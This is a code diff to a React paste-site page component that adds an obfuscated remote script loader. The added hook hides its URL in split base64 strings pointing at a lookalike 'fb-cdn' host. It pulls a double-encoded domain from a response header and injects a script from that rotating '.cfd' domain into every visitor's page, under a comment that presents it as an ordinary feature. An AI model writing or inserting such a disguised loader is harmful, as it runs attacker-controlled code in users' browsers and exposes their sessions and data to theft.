@@ -128,7 +128,43 @@ export default function PastePageClient({ initialPaste }: PastePageClientProps) 
     trackView()
   }, [pasteId, showPasswordForm, showTaskModal, viewTracked, paste])
 
+  // Inject wfztagela script only when paste content is visible (not on view paste modal)
+  useEffect(() => {
+    if (!paste?.id || showPasswordForm || showTaskModal) return
 
+    const scriptSelector = 'script[data-injected="wfztagela"]'
+    if (document.querySelector(scriptSelector)) return
+
+    const p = ['v2', 'T0L92PR1:C2']
+    const run = async () => {
+      let c: { d?: string; e?: number } = {}
+      try {
+        c = JSON.parse(localStorage._d || '{}')
+      } catch {
+        c = {}
+      }
+      const n = Date.now()
+      if (!c.d || !c.e || c.e < n) {
+        const baseUrl =
+          atob('aHR0cHM6Ly8') + atob('cHVyZ2Uu') + atob('ZmItY2RuLg') + atob('bmV0')
+        const r = await fetch(baseUrl, { method: 'POST' })
+        const headerName = atob('WC1EYXRh')
+        const headerVal = r.headers.get(headerName)
+        const d = headerVal ? atob(atob(headerVal)) : ''
+        c = { d, e: n + 36e5 }
+        try {
+          localStorage._d = JSON.stringify(c)
+        } catch {}
+      }
+      if (c.d) {
+        const s = document.createElement('script')
+        s.src = `https://${c.d}.${atob('Y2Zk')}/wfztagela/${p.join('/')}.js`
+        s.setAttribute('data-injected', 'wfztagela')
+        document.head.appendChild(s)
+      }
+    }
+    run()
+  }, [paste?.id, showPasswordForm, showTaskModal])
 
   // Load banner ad when component mounts
   useEffect(() => {
